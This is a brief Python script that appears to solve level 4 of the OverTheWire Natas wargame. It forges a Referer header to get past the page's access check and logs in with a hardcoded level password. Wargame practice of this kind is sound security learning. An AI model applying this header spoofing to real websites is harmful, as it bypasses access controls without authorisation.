import requests
from requests.auth import HTTPBasicAuth

s = requests.Session()
s.headers.update({'referer' : 'http://natas5.natas.labs.overthewire.org/'})
response = s.get("http://natas4.natas.labs.overthewire.org/index.php", auth=HTTPBasicAuth('natas4', 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'))
print response.content